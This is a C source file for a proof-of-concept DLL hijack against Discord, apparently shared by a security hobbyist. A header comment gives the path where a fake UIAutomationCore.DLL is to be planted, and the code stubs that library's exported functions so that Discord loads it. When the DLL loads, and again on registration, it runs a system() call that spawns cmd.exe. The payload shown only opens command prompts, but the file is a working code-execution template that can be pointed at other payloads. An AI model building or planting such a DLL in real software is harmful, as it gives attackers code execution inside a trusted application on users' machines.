// twitter: @cwinfosec
// "why does this keep launching command prompts????? LMAO????" 
// shoutout: InfoSec Prep
//
// hint: C:\Users\bababooey\AppData\Local\Discord\app-1.0.9002\UIAutomationCore.DLL

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#pragma comment( linker, "/export:UiaClientsAreListening=_UiaClientsAreListening@0" )
#pragma comment( linker, "/export:UiaGetReservedMixedAttributeValue=_UiaGetReservedMixedAttributeValue@0" )
#pragma comment( linker, "/export:UiaGetReservedNotSupportedValue=_UiaGetReservedNotSupportedValue@0" )
#pragma comment( linker, "/export:UiaHostProviderFromHwnd=_UiaHostProviderFromHwnd@0" )
#pragma comment( linker, "/export:UiaRaiseAutomationEvent=_UiaRaiseAutomationEvent@0" )
#pragma comment( linker, "/export:UiaRaiseAutomationPropertyChangedEvent=_UiaRaiseAutomationPropertyChangedEvent@0" )
#pragma comment( linker, "/export:UiaRaiseStructureChangedEvent=_UiaRaiseStructureChangedEvent@0" )
#pragma comment( linker, "/export:UiaReturnRawElementProvider=_UiaReturnRawElementProvider@0" )

int launch20bajillioncmds()
{
    system("c:\\windows\\system32\\cmd.exe /C \"cmd.exe\"");
    return 0;
}

STDAPI UiaClientsAreListening()
{
    return TRUE;
}

STDAPI UiaReturnRawElementProvider()
{
    return TRUE;
}

STDAPI UiaRaiseStructureChangedEvent()
{
    return TRUE;
}

STDAPI UiaRaiseAutomationPropertyChangedEvent()
{
    return TRUE;
}

STDAPI UiaRaiseAutomationEvent()
{
    return TRUE;
}

STDAPI UiaHostProviderFromHwnd()
{
    return TRUE;
}

STDAPI UiaGetReservedMixedAttributeValue()
{
    return TRUE;
}

STDAPI UiaGetReservedNotSupportedValue()
{
    return TRUE;
}

STDAPI DllCanUnloadNow(void)
{
    return TRUE;
}

STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID FAR* ppv)
{
    return TRUE;
}

STDAPI DllRegisterServer(void)
{
    system("c:\\windows\\system32\\cmd.exe /C \"cmd.exe\"");
    return TRUE;
}

STDAPI DllUnregisterServer(void)
{
    return TRUE;
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        launch20bajillioncmds();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

